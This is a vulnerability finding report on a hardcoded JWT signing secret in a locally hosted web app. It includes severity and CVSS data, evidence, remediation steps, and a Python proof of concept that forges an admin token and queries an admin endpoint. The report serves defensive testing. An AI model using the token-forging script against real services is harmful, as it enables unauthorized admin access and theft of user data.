# JWT Authentication Bypass via Hardcoded Secret

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-08-02 12:17:36 UTC
**Target:** http://host.docker.internal:5000
**CWE:** CWE-798
**CVSS:** 9.1
**Fix Effort:** Low

## Description

The application uses a hardcoded JWT signing secret (`super-secret-jwt-key-123`) in the source code, allowing an attacker to forge arbitrary tokens with any user ID, username, or role claim.

## Evidence

Source code contains: SECRET_KEY = "super-secret-jwt-key-123"

## Impact

Complete authentication bypass. An attacker can forge admin tokens to access all admin endpoints, access any user's data, and escalate privileges.

## Technical Analysis

The JWT secret is hardcoded in app.py:10: SECRET_KEY = "super-secret-jwt-key-123". The require_auth decorator verifies tokens using this known secret. An attacker can forge tokens with arbitrary claims including user_id, username, and role fields to impersonate any user, including administrators.

## Proof of Concept

1. Extract hardcoded secret from source code
2. Forge a JWT token with admin claims using HS256
3. Send forged token to /api/admin/users endpoint
4. Observe successful authentication and access to admin data

```
import jwt
import requests

SECRET = "super-secret-jwt-key-123"
admin_token = jwt.encode({"user_id": 1, "username": "admin", "role": "admin"}, SECRET, algorithm="HS256")
headers = {"Authorization": f"Bearer {admin_token}"}
resp = requests.get("http://host.docker.internal:5000/api/admin/users", headers=headers)
print(f"Status: {resp.status_code}, Data: {resp.text[:200]}")
```

## Remediation

1. Generate a strong, random secret key (minimum 256 bits)
2. Store the secret in environment variables or a secrets manager
3. Never commit secrets to source code
4. Rotate secrets periodically

## Assumptions

Attacker has access to source code or can recover the hardcoded secret.
